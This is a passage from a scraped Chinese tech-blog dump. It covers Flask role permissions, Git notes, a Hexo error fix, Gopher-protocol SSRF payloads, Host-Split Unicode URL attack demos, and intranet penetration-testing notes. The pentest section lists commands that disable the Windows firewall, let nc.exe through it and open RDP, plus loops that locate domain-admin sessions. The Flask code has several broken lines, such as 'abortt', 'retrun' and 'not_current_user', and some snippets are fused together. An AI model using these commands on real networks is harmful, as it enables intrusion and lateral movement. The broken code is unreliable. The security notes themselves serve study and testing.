Permission.MODERATE, Permission.ADMIN] } default_role = 'User' for r in roles: role = Role.query.filter_by(name=r).first() if role is None: role = Role(name=r) role.reset_permission() for perm in roles[r]: role.add_permission(perm) role.default = (role.name == default_role) db.session.add(role) db.session.commit() insert_roles 函数不直接创建角色对象，通过角色名查找现有的角色，然后进行更新。没有角色时创建新角色对象。它是一个静态方法，不需要创建对象，直接在类上调用，例如Role.insert_roles()，静态方法参数中没有 self。 赋予角色用户注册账户时应被赋予用户角色，管理员在最开始就应该赋予 管理员 角色，由保存在设置变量FLASKY_ADMIN 中的电子邮件地址识别，app/models.py： 12345678910class User(UserMixin, db.Model): # ... def __init__(self, **args): super(User, self).__init(**kwargs) if self.role is None: if self.email == current_app.config['FLASKY_ADMIN']: self.role = Role.query.filter_by(name='Administrator').first() if self.role is None: self.role = Role.query.filter_by(default=True).first# ... User 类的构造函数先调用积累的构造函数，如果没有定义角色，用电子邮件确定角色。 检验角色为了简化角色和权限的实现过程，可在User模型中添加辅助方法，检查权限，可以委托前面添加的权限管理方法，app/models.py： 1234567891011121314from flask_login import UserMixin, AnonymousUserMixinclass User(UserMixin, db.Model): # ... def can(self, perm): return self.role is not None and self.role.hase_permission(perm) def is_administrator(self): return self.can(Permission.ADMIN)class AnonymousUser(AnonymousUserMixin): def can(self, permissions): return False def is_administrator(self): return Falselogin_manager.anonymous_user = AnonymousUser 如果想让视图函数只对由特定权限的用户开放，可以使用自定义装饰器。app/decorators.py： 12345678910111213141516from functools import wrapsfrom flask_import abortfrom flask_login import current_userdef permission_required(permission): def decorator(f): @wraps(f) def decorated_funtion(*args, **kwargs): if not_current_user.can(permission): abortt(403) return f(*args, **kwargs) retrun decorated_funtion return decoratordef admin_required(f): return permission_required(Permission.ADMIN)(f) 装饰器的使用： 123456789101112from .decorators import admin_required, permission_required@main.route('/admin')@login_required@admin_requireddef for_admins_only(): return &quot;For administrators&quot;@main.route('/moderate')@login_required@permission_required(Permission.MODERATE)def for_moderators_only(): return &quot;For comment moderators&quot; 在模板中可能也需要检查权限，所以Permission类的所有常量要能在模板中访问，为了避免每次都调用 render_template 时多添加一个参数，可以使用上下文处理器。在渲染时，上下文处理器能让变量在所有模板中可访问，app/main/__init__.py： 123@main.app_context_processordef inject_permissions(): return dict(Permission=Permission) 编写角色和权限的测试，tests/test_user_model.py： 12345678910111213141516class UserModelTestCase(unittest.TestCase): # ... def test_user_role(self): u = User(email='john@example.com', password='cat') self.assertTrue(u.can(Permission.FOLLOW)) self.assertTrue(u.can(Permission.COMMENT)) self.assertTrue(u.can(Permission.WRITE)) self.assertFalse(u.can(Permission.MODERATE)) self.assertFalse(u.can(Permission.ADMIN)) def test_anonymous_user(self): u = AnonymousUser() self.assertFalse(u.can(Permission.FOLLOW)) self.assertFalse(u.can(Permission.COMMENT)) self.assertFalse(u.can(Permission.WRITE)) self.assertFalse(u.can(Permission.MODERATE)) self.assertFalse(u.can(Permission.ADMIN)) 先在 shell 会话中添加这些新角色到开发数据库 123flask shellRole.insert_roles()Role.query.all() 最好更新用户列表，为在此之前创建的用户账户分配用户角色 123456789flask shelladmin_role = Role.query.filter_by(name='Administrator').first()default_role = Role.query.filter_by(default=True).first()for u in User.query.all(): if u.email == app.config['FLASKY_ADMIN']: u.role = admin_role else: u.role = default_roledb.session.commit() 用户资料资料信息在数据库中存储一些额外信息用于站视，扩充 User模型，app/models.py： 1234567class User(UserMixin, db.Model): # ... name = db.Column(db.String(64)) location = db.Column(db.String(64)) about_me = db.Column(db.Text()) member_since = db.Column(db.DateTime(), default=datatime.utcnow) last_seen = db.Column(db.dateTime(), default=datetime.utcnow) db.Column的default参数可以接受函数作为参数，每次需要生成默认值，SQLAlchemy都会调用指定的函数。member_since只需要使用一次默认值，而last_seen每次用户访问后都需要刷新，可以在User类中添加一个方法执行这个操作，app/models.py： 123456class User(UserMixin, db.Model): # ... def ping(self): self.last_seen = datetime.utcnow() db.session.add(self) db.session.commit() 每次收到用户请求都要调用这个 ping 方法，可以使用 auth 蓝本中的 before_app_request 处理程序，app/auth/views.py： 1","link":"/2019/11/23/flask/"},{"title":"Git 笔记","text":"Git 笔记 Git 工作流程Git 一般工作流程如下： 克隆 git 资源/新建 git 仓库 作为工作目录 添加或修改文件 如果其他人修改了，你可以更新资源 在提交前查看修改 提交修改 在修改完成后，如果发现错误，可以撤回提交并再次修改提交 Git 工作区、暂存区和版本库工作区：工作目录 暂存区(index/stage)：一般存放在.git/index中 版本库：.git隐藏目录 左侧为工作区，右侧为版本库，版本库中标记 index 的位置为暂存区，标记 master 的是 master 分支代表的目录树。 图中我们可以看出此时 HEAD 实际是指向 master 分支的一个”游标”。所以图示的命令中出现 HEAD 的地方可以用 master 来替换。 图中的 objects 标识的区域为 Git 的对象库，实际位于 .git/objects目录下，里面包含了创建的各种对象及内容。 当对工作区修改（或新增）的文件执行 git add 命令时，暂存区的目录树被更新，同时工作区修改（或新增）的文件内容被写入到对象库中的一个新的对象中，而该对象的ID被记录在暂存区的文件索引中。 当执行提交操作git commit时，暂存区的目录树写到版本库（对象库）中，master 分支会做相应的更新。即 master 指向的目录树就是提交时暂存区的目录树。 当执行 git reset HEAD 命令时，暂存区的目录树会被重写，被 master 分支指向的目录树所替换，但是工作区不受影响。 当执行 git rm --cached &lt;file&gt;命令时，会直接从暂存区删除文件，工作区则不做出改变。 当执行 git checkout . 或者 git checkout -- &lt;file&gt;&quot;命令时，会用暂存区全部或指定的文件替换工作区的文件。这个操作很危险，会清除工作区中未添加到暂存区的改动。 当执行 git checkout HEAD .或者 git checkout HEAD &lt;file&gt; 命令时，会用 HEAD 指向的 master 分支中的全部或者部分文件替换暂存区和以及工作区中的文件。这个命令也是极具危险性的，因为不但会清除工作区中未提交的改动，也会清除暂存区中未提交的改动。 创建仓库git init，初始化一个 git 仓库，默认在当前目录创建，也可以使用git int &lt;directory&gt;在指定目录创建。 创建完成后，新的仓库下会出现.git目录，git 需要的数据和资源存放在这里。如果有想要加入版本控制的文件，需要先使用git add对这些文件进行跟踪，然后提交。 123git add *.cgit add READMEgit commit -m '初始化' git clone，从现有仓库拷贝项目，格式为git clone &lt;repo&gt;，如果要克隆到指定的目录，使用git clone &lt;repo&gt; &lt;directory&gt; 基本操作 命令 作用 git init &lt;directory&gt; 在当前目录初始化仓库或者在指定目录初始化仓库 git clone &lt;repo&gt; 克隆指定仓库 git add &lt;file&gt; 将指定文件添加到缓存 git status 查看项目状态 git diff 查看项目详细信息 git commit 将缓存区的内容添加到仓库中 git config 配置用户名或邮箱地址 git reset HEAD&lt;file&gt; 取消已缓存的内容 git rm &lt;file&gt; 删除文件并从已跟踪的文件清单中清除。如果删除之前修改过并且已经放到暂存区，需要添加-f。如果仅仅想从已跟踪的文件清单中清楚使用--cache git mv 移动或重命名一个文件、目录或软链接 分支管理 命令 作用 git branch 列出当前分支，使用git branch &lt;name&gt;创建新分支 git checkout &lt;branch&gt; 切换到另一个分支，使用-b选项创建新分支并切换到该分支，使用-d选项删除分支 git merge &lt;branch&gt; 合并分支 查看提交历史使用git log查看提交历史，--oneline查看简洁版本，graph查看历史中什么时候出现分支，--reverse逆向显示，author查看指定用户的提交日志，--since和--before指定时间。 标签项目到达一个截断，可以使用git tag打上标签 -a使用带注解的标签，使用不带参数的命令查看所有标签，使用-m指定信息，使用-s添加PGP签名标签。","link":"/2020/06/23/git/"},{"title":"Gopher 协议利用","text":"gopher 协议利用 Gopher 协议Gopher 是一个通信协议，用来设计，分配，搜索与检索文档中的 internet 协议的网络。利用 gopher 可以对 FTP，telnet，redis，memcache，基于一个 TCP 包的 exploit 等进行内网攻击，扩展了攻击面。 格式1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt; 如果省略 port，默认为 70 端口 gopher-path 可以是以下几种格式之一： 1234空 # 定界“/”也可以为空， gophertype 默认为 “1”&lt;gophertype&gt;&lt;selector&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;&lt;gophertype&gt;&lt;selector&gt;%09&lt;search&gt;%09&lt;gopher_string&gt; gophertype 是一个单字符字段，表示 URL 所引用资源的 gopher 类型 selector 是 gopher 选择器字符串。在 gopher 协议中， gopher 选择器字符串，是一个8位字节序列，可以包含除 09H（制表符），0AH（LF）和 0DH（CR）以外的任意8位字节。 search 用于向 gopher 搜索引擎提交搜索数据，和 selector 之间用 %09 分隔。 gopher 客户端通过将 gopher selector 字符串发送到 gopher 服务器来指定要检索的项目 转换规则 如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。 如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。 将\\r字符串替换成%0d%0a。 空白行替换为%0a。 问号需要转码为URL编码%3f，同理空格转换成%20。 在包的最后要加%0d%0a，代表消息结束。 转换实例需要在传输的数据前加一个无用字符 使用 gopher 协议发送 HTTP 请求 一个简单的 GET 请求： 123GET /edit.php?a=Hi HTTP/1.1Host: 127.0.0.1Connection: close 依照转换规则，转换为 gopher 协议 1gopher://192.168.11.1:80/_GET%20/edit.php%3fa=Hi%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0a POST 同理 12345POST /edit.php HTTP/1.1Host: 127.0.0.1Connection: closeContent-Type: application/x-www-form-urlencodeda=Hi 转换后 1gopher://192.168.11.1:80/_POST%20/edit.php%3fa=Hi%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0a 工具Gopherus FTPTCP 流 1234567USER &lt;user&gt;PASS &lt;pass&gt;PWDEPSVTYPE ALISTQUIT redisMysqlFAST CGIXXE","link":"/2020/10/03/gopher/"},{"title":"解决 Hexo 的 FATAL Something is wrong","text":"使用的 hexo 搭建博客，主题是 icarus 更新时出现以下错误： 12345678910111213141516171819202122232425262728293031323334353637$ hexo gINFO ======================================= ██╗ ██████╗ █████╗ ██████╗ ██╗ ██╗███████╗ ██║██╔════╝██╔══██╗██╔══██╗██║ ██║██╔════╝ ██║██║ ███████║██████╔╝██║ ██║███████╗ ██║██║ ██╔══██║██╔══██╗██║ ██║╚════██║ ██║╚██████╗██║ ██║██║ ██║╚██████╔╝███████║ ╚═╝ ╚═════╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝ ╚══════╝=============================================INFO Checking dependenciesINFO Validating the configuration fileINFO Start processingFATAL Something's wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlTemplate render error: (unknown path) Error: filter not found: filter at Object._prettifyError (F:\\blog\\node_modules\\nunjucks\\src\\lib.js:36:11) at F:\\blog\\node_modules\\nunjucks\\src\\environment.js:567:19 at Template.root [as rootRenderFunc] (eval at _compile (F:\\blog\\node_modules\\nunjucks\\src\\environment.js:637:18), &lt;anonymous&gt;:21:3) at Template.render (F:\\blog\\node_modules\\nunjucks\\src\\environment.js:556:10) at Environment.renderString (F:\\blog\\node_modules\\nunjucks\\src\\environment.js:380:17) at Promise.fromCallback.cb (F:\\blog\\node_modules\\hexo\\lib\\extend\\tag.js:123:48) at tryCatcher (F:\\blog\\node_modules\\bluebird\\js\\release\\util.js:16:23) at Function.Promise.fromNode.Promise.fromCallback (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:185:30) at Tag.render (F:\\blog\\node_modules\\hexo\\lib\\extend\\tag.js:123:18) at Object.onRenderEnd (F:\\blog\\node_modules\\hexo\\lib\\hexo\\post.js:280:20) at Promise.then.then.result (F:\\blog\\node_modules\\hexo\\lib\\hexo\\render.js:64:19) at tryCatcher (F:\\blog\\node_modules\\bluebird\\js\\release\\util.js:16:23) at Promise._settlePromiseFromHandler (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:517:31) at Promise._settlePromise (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:574:18) at Promise._settlePromise0 (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:619:10) at Promise._settlePromises (F:\\blog\\node_modules\\bluebird\\js\\release\\promise.js:699:18) at _drainQueueStep (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:138:12) at _drainQueue (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:131:9) at Async._drainQueues (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:147:5) at Immediate.Async.drainQueues (F:\\blog\\node_modules\\bluebird\\js\\release\\async.js:17:14) at runCallback (timers.js:705:18) at tryOnImmediate (timers.js:676:5) 通过把文章移除_post文件夹，再运行hexo g的方式定位到了出问题的文章，又通过删除一段文字再hexo g的方式定位到了出问题的段落： 1变量的值可以用过滤器修改，形如``{{ variable|filter }}`` 多次尝试发现，除这种形式外，不用两个反引号引起的上段也会造成错误，原因不明。 解决方案：改用三个反引号","link":"/2019/11/29/hexobug/"},{"title":"Host-Split attack","text":"[Black Hat USA 2019 PPT Presentation](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pd f) 背景：Unicode 域名（IDN, Internationalizing domain name）如何工作𓀬.net，这样的域名底层依然是ASCII，对应xn--fq7d.net。 Unicode转化为ASCII。 标准化（Normalization），例如：Å(U+00C5)、Å(U+212B)、Å(U+0041, U+030A)都会被标准化为å(U+00E5)。 Punycoding, 把Unicode转化为ASCII。FISKMÅS转化为xn--fiskms-mus，xn--是punycode的标志，fiskms是ASCII部分，-mus是状态机指令。 ASCII转化为Unicode：只需要运行 Punycode状态机并且 rehydrate the Unicode(?). HostSplit Vulnerability - making URL ‘s that switch domains例如，攻击OAuth： OAUTH Authorization Code Flow(RFC 6749 4.1)，Client web site 发送 Application ID, Redirect URI 到认证服务器，认证服务器发送 Authorization Code（Sent to redirect URI）回Client web site。 认证服务器存有 allow list pattern 用于验证 redirect URI。在OAuth 1.0中，常用类似*.office.com的allow list。http://evil.c℀.office.com能正常工作，检查这个域名是否在allow list中时会标准化，然后将浏览器重定向到https://evil.ca/c.office.com。 现在的OAuth实现使用了更严格的allow list patterns，通常使用确定的域名。以上例子只能绕过子域名检查。 在标准化步骤，有一些Unicode字符可能转化成了带有语法标志的ASCII字符，例如：℀(U+2100)对应a/c。于是https://evil.c℀.example.com会变成https://evil.ca/c.example.com，这样就不会执行第二步 Punycoding，因为这里全部都是ASCII字符。 Edge/IE有这样的问题，.Net，python和java也存在类似的问题。 Example exploit - stealing OAUTH tokens from O365Ofiice.live.com 接受 Office OAUTH tokens 并且可以重定向到dropbox.com或者它的子域名。 https://office.live.com/start/word.aspx?h4b=dropbox&amp;eurl=https://fake.c%E2%84%80.dropbox.com/wopi_edit/document1.docx&amp;furl=https://www.dropbox.com/wopi_download/document1.docx&amp;c4b=1，这个URL作为OAUTH target可以盗取tokens。 但是一个bug拯救了它。 What was vulnerable / what’s still vulnerableNot just OAUTH ，Edge/IE和℀。 遵循IDNA2008并设置UseSTD3ASCIIRules可以修复了，但没有广泛采用。UseSTD3ASCIIRules只允许少量Unicode字符，已在使用的域名中有很多不符合这样的要求。 Egde/IE修复了漏洞（CVE-2019-0654），Firefox，Chrome安全，Safari可能存在风险。 .Net.Net曾经存在风险： 1234string url = @&quot;http://canada.c℀.products.office.com/test/exe&quot;;UriBuilder uriBuilder = new UriBuilder(url);IdnMapping idnMapping = new IdnMapping();System.Console.WriteLine(url); 输出http://canada.ca/c.products.office.com/test.ext。目前已修复（CVE-2019-0657）。 Pythonpython存在风险： 123456789101112&gt;&gt;&gt; from urllib.parseimport urlsplit, urlunsplit&gt;&gt;&gt; url= 'http://canada.c℀.microsoft.com/some.txt'&gt;&gt;&gt; parts = list(urlsplit(url))&gt;&gt;&gt; host = parts[1]&gt;&gt;&gt; host'canada.ca/c.microsoft.com'&gt;&gt;&gt; newhost= []&gt;&gt;&gt; for h in host.split('.'):... newhost.append(h.encode('idna').decode('utf-8'))...&gt;&gt;&gt; parts[1] = '.'.join(newhost)&gt;&gt;&gt; finalUrl= urlunsplit(parts)&gt;&gt;&gt; finalUrl'http://canada.ca/c.microsoft.com/some.txt' 还有变体： 12345678910&gt;&gt;&gt; from urllib.parseimport urlparse&gt;&gt;&gt; r='http://bing.com'+u'\\uFF03'+':password@products.office.com'&gt;&gt;&gt; o = urlparse(r)&gt;&gt;&gt; o.hostname'products.office.com'&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;)&gt;&gt;&gt; a'http://bing.com#:password@products.office.com'&gt;&gt;&gt; o = urlparse(a)&gt;&gt;&gt; o.hostname'bing.com' 分别在 CVE-2019-9636 和 CVE-2019-10160 中修复。 Java1234567891011121314import java.net.*;public class IDNTest{ public static void main(String[] args) throws Exception { String idnTest = &quot;evil.C\\u20100B.microsoft.com&quot;; String result = IDN.toASCII(idnTest); System.out.print(result + &quot;\\n&quot;); URL myUrl = new URL(&quot;http://evil.c\\u2100B.microsoft.com&quot;); System.out.print(myUrl.getHost() + &quot;\\n&quot;); }} 输出http://evil.CA/B.Microsoft.com 在 CVE-2019-2816 / S8221518 修复。 WindowsWindows API IdnToASCII存在问题，设置标志IDN_USE_STD3ASCII_RULES可以解决。 LinuxLibIDN和 LibIDN2 存在问题，LibIDN设置usestd3asciiruls标志，LibIDN2设置no-tr46标志。","link":"/2020/03/12/host-split-attack/"},{"title":"内网渗透","text":"《内网安全攻防——渗透测试实战指南》笔记 内网信息收集概述信息收集目标： 判断当前机器角色，是普通 Web 服务器、开发测试服务器、公共服务器、文件服务器、代理服务器、DNS 服务器还是存储服务器等等 判断当前机器所处网络环境的拓扑结构，是对所处内网进行全面的信息收集，和分析整理，绘制大概的内网整体拓扑结构图 判断当前机器所处区域，是指判断当前按机器处于网络拓扑中的哪个位置，是在 DMZ 区、办公区还是核心区 收集本机信息手动收集本机信息包括系统、权限、内网 IP 地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般是一键安装的。 相关命令： 命令 作用 ipconfig /all 获取本机网络配置信息 ``systeminfo findstr /B /C:”OS Name” /C:”OS Version”`` echo %PROCESSOR_ARCHITECTURE% 查看系统架构 wmic product get name,version 查看安装软件信息 ``powershell “GET-WmiObject -class Win32_Product Select-Object -Property name,version”`` wmic service list brief 查看服务信息 tasklist 查看进程信息 wmic process list brief 查看进程信息 wmic startup get command,caption 查看启动程序信息 schtasks /query /fo LIST /v 查看计划任务 net statistics workstation 查看开机时间 net user 查看用户列表，可以寻找用户命名规律 net localgroup administrators 查看本地管理员，有时会有域用户被添加为域机器的本地管理员 net session 列出或断开本地计算机域所连接的客户端之间的会话 netstat -ano 查看端口信息 system info 查看补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn 查看安装在系统中的补丁 net share 查看本机共享列表 wmic share name,path,status 查看本机共享列表 route print 查看路由表 arp -a 查看MAC地址 netsh firewall show config 查看防火墙配置 netsh firewall set opmode disable Windows Server 2003及以前的版本，禁用防火墙 netsh advfirewall set allprofiles state off Windows Server 2003 之后版本，禁用防火墙 netsh firewalll add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable Windows Server 2003 之前，允许 nc 全部连接 netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; Windows Server 2003之后，允许 nc 进入 netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; Windows Server 2003 之后，允许 nc 出 netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocal=TCP dir=in localport=3389 action=allow Windows Server 2003之后，允许3389 netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; 自定义防火墙日志文件位置 reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; 查看代理配置情况 reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /V PortNumber 查看远程连接端口(十六进制) wmic path win32_terminalservicesetting where (__classCLASS !=&quot;&quot;) call setallowtsconnections 1 Windows Server 2003 开启 3389 端口 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalsetting where (__class !=&quot;&quot;) call setallowtsconnections 1 Windows Server 2008 和 2012 开启3389端口 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalgeneralsetting where (TermicalName='RDP-Tcp') call setuserauthenticationrequired 1 Windows Server 2008 和 2012 开启3389端口 reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DOWRD /d 0 /f Windows Server 2008 和 2012 开启3389端口 常见杀软进程名称： 进程 软件 360sd.exe 360杀毒 360tray.exe 360实时防护 ZhuDongFangYu.exe 360主动防御 KSafeTray.exe 金山卫士 SafeDogUpdateCenter.exe 服务器安全狗 McAfee McShield.exe McAfee egui.exe NOD32 AVP.EXE 卡巴斯基 avguard.exe 小红伞 bdagent.exe BitDefender 自动收集使用 WMIC(Windows Management Instrumentation Command-Line)，脚本自动获取所需的信息。默认情况下，任何版本的 Windows XP 的低权限用户不能访问 WMIC，Windows 7 以上版本的低权限用户允许访问 WMIC 并执行相关查询操作，推荐脚本：wmic_info.bat Empire 下的主机信息收集12usemodule situational_awareness/host/winenumusemodule situational_awareness/host/computerdetails 查询当前权限如果内网中存在域，本地普通用户只能查询本机信息，无法查询域内信息；本地管理员和域用户可以查询域内信息。 命令 作用 whoami 查询当前权限 whoami /all 查询域 SID net user username /domain 查询指定用户的详细信息 判断是否存在域获取了本机信息之后，需要判断内网中是否存在域，如果存在，当前主机是否在域内。通常有多种方法。 查看网络配置使用 ipconfig /all 查看网关 IP 地址、DNS IP地址、域名、本机是否和 DNS 处于同一网段等信息，然后通过反向解析查询命令 nslookup example.domainname 解析域名的 IP 地址，判断域控制器和 DNS 服务器是否是同一台服务器。 查看系统详细信息使用 systeminfo 查看系统详细信息，域 为域名，如果 域 为 WORKGROUP 则本机不在域内，登陆服务器为域控。 查询当前登陆域及登录用户信息使用 net config workstation，工作站域 DNS 名称为域名，登陆域表示当前登录用户是域用户或者本地用户， 判断主域使用 net time /domain 查询时间，由于与服务器通常会同时作为时间服务器，可以用于判断主域。执行结果分为以下几种情况： 存在域，但当前用户不是域用户 12发生系统错误 5拒绝访问 存在域，且当前用户是域用户 1\\\\DC.hacke.testlab 的当前时间是 2020/7/29 18:04:07 当前网络环境为工作组，不存在域 1找不到域 WORKGROUP 的域控制器 探测域内存活主机使用 NetBIOS 快速探测内网NetBIOS 是局域网程序使用的一种 API为应用程序提供了请求低级别服务的统一指令集，为局域网提供了网络及其他特殊功能，几乎所有的局域网都是在 NetBIOS协议的基础上工作的，推荐优先使用。 使用 nbtscan 扫描内网，Windows 版，Linux版，不输入任何参数可查看帮助 1nbtscan.exe 192.168.1.0/24 扫描结果第一列为 IP 地址，第二列为所在域，第三列为开启的服务 Token 含义 SHARING 该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享 DC 可能是域控制器 U=USER 可能有登录名为 USER 的用户 IIS 可能安装 IIS 服务器 EXCHANGE 可能安装了 Exchange NOTES 可能安装了 Lotus Notes 电子邮件客户端 ? 没有识别出该机器的 NetBIOS 资源，可使用 -F再次扫描 利用 ICMP 协议快速探测内网扫描 C 段： 1for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot; 也可利用 VBS 脚本 利用 ARP 探测内网使用 arpscan 利用 arp 协议扫描，Windows 版，Kali 可以使用 apt 安装 1arpscan.exe -t 192.168.1.0/24 也可以使用 Empire 的 arpscan 模块或者 Nishang 中的 Invoke-ARPScan.ps1 脚本 通过常规 TCP/UDP 端口扫描探测内网使用 ScanLine 探测端口 1scanline -h -t 22,80-89,110,389,445,3389,1433,2049 -u 53,161 -O C:\\Windows\\temp\\log.txt -p 192.168.1.1-254 /b 扫描域内端口利用 telnet 扫描如果单纯检查某个高危端口是否开放可以选择 telnet 12telnet DC 1433telnet 192.168.1.4 22 S 扫描器S 扫描器适合运行于 Windows Server 2003 以下的机器，扫描结果默认保存在安装目录下的 result.txt 文件中，推荐使用 TCP 扫描 1S.exe TCP 192.168.1.1 192.168.1.254 445,3389 /Banner /save MetasploitMetasploit 不仅提供了多种端口扫描技术，还提供了与其他扫描工具的接口 1use auxiliary/scanner/portscan/tcp PowerSploit 的 Invoke-portscan.ps1Nishang 的 Invoke-PortScan 模块Banner 信息扫描到开放端口后，可以使用 nc 或者客户端连接端口获取 Banner 信息，用于在漏洞库中检索对应的 POC，EXP。常用漏洞库 安全焦点中的 BugTraq Exploit-DB 收集域内基础信息确定当前内网的域，以及所控制的主机在域内，就可以进行域内相关信息的收集，以下的方法都是通过 LDAP 协议到域控制器上进行查询，因此只有域用户和本地 System 用户具有权限。 命令 作用 net view /domain 查询域 net view /domain:HACKE 查询域内所有主机 net group /domain 查询用户组列表 net group &quot;domain computers&quot; /domain 查询域成员 net accounts /domain 获取域密码策略 nltest /domain_trusts 查询域信任信息 查找域控制器 命令 作用 nltest /DCLIST:hacke 查看域控制器机器名 nslookup -type=SRV _ldap._tcp 查看域控制器主机名 net time /domain 查看时间 net group &quot;Domain Controllers&quot; /domain 查看域控制器组 netdom query pdc 查看域控制器机器名 获取域内用户和管理员信息查询域用户列表 命令 作用 net user /domain 查询用户列表 wmic useraccount get /all 查询域内用户详细信息 dsquery user 查询存在的用户 net localgroup administrators 查询本地管理员组用户，Domain Admins 组的用户默认为域内机器的本笃管理员用户 查询域管理员用户组 命令 作用 net group &quot;domain admins&quot; /domain 查询域管理员用户 net group &quot;Enterprise Admins&quot; /domain 查询域管理员用户 定位域管理员概述一个域中，当计算机加入域后，会默认给域管理员组赋予本地管理员权限。 定位域管理员的方式，一是日志，二是会话。日志是指本地机器的管理员日志，可以通过脚本或 Wevtutil 工具导出查看。会话是指域内每台机器的登录会话，可以使用 netsess.exe 或 PowerView 等工具查询（可以匿名，不需要权限）。 常用域管理员定位工具假设已经取得了域内普通用户的权限，希望横向移动，需要知道域内用户登录的位置、他是否是任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组有助于了解域内布局。 常用域管理员定位工具有 psloggedon.exe、PVEFinADUser.exe、netsess.exe、以及 hunter、NetView 等。在 PowerShell 中，常用的是 PowerView。 查找域管理进程本机检查12net group &quot;Domain Admins&quot; /Domain # 查看域管理员tasklist /v # 列出本机的所有进程和进程用户，在其中寻找域管理员进程 查询域控制器的域用户会话在域控制器中查找域用户会话列表，并将其于域管理员列表进行交叉引用，从而得到域管理会话的系统列表。 查询域控制器列表，可以使用 LDAP 查询从 Domain Controllers 单元中收集的域控制器列表或者使用 net group &quot;Domain Controllers&quot; /domain&quot; 收集域管理员列表，可以使用 LDAP 查询或者使用 net group &quot;Domain Admins&quot; /domain 收集所有活动域的会话列表，可以使用 netsess.exe，NetSess -h 交叉引用域管理员列表和活动绘画列表，可以确定哪些 IP 地址有活动域令牌。将域控制器列表保存到 dcs.txt，域管理员列表保存到 admins.txt，执行 1FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt;sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt |findstr /I %a 类似的也可以使用 Get Domain Admins 脚本。 查询远程系统中运行的任务如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以用以下方式查询系统中的域管理员任务，将目标域系统列表添加到 ips.txt，将收集到的域管理员列表添加到 names.txt 12net group &quot;Domain Admins&quot; /domainFor /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;nul &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; nul &amp;&amp; echo [!] %n was found running a prosess on %i &amp;&amp; pause 扫描远程系统的 NetBIOS 信息某些版本的 Windows 允许用户通过 NetBIOS 查询已登录用户，将目标域系统添加到 ips.txt，将收集到的域管理员列表添加到 admins.txt 1for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;nul &gt; nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt;nul &amp;&amp; echo [!] %n was found logged into %i 也可以使用 nbtscan 工具， 1for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;nul &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt;nul &amp;&amp; echo [!] %n was found logged into %i 利用 PowerShell- 域分析工具 BloodHound- 敏感数据的防护- 分析域内网段划分情况和拓扑结构- 隐藏通信隧道技术基础知识概述常见隧道： 网络层：IPv6，ICMP，GRE 传输层：TCP，UDP，端口转发 应用层：SSH，HTTP，HTTPS，DNS 判断内网连通性 ICMP：ping &lt;ip&gt; TCP：nc &lt;ip&gt; &lt;port&gt; HTTP：curl &lt;ip&gt;:&lt;port&gt; DNS：nslookup &lt;domainname&gt; &lt;vps-ip&gt;，dig @&lt;vps-ip&gt; &lt;domainname&gt; 有时流量不能直接流出，需要在内网中设置代理服务器，常用于通过企业办公网段上网的场景。判断方式：查看网络连接是否有与其他主机的8080端口（大概率）存在连接；查看内网中是否有主机名类似于 “proxy” 的机器；查看 IE 浏览器的直接代理；根据 pac 文件的路径（本地或远程），下载并查看；执行以下命令确认 12curl www.baidu.com # 不通curl -X &lt;proxyip:port&gt; www.baidu.com # 通 网络层隧道IPv6 隧道IPv6 隧道技术指通过 IPv4 隧道传递 IPv6 数据报文的技术。 工具：socat, 6tunnel, nt6tunnel ICMP 隧道工具：icmpsh, pingtunnel 传输层隧道技术工具：lcx, 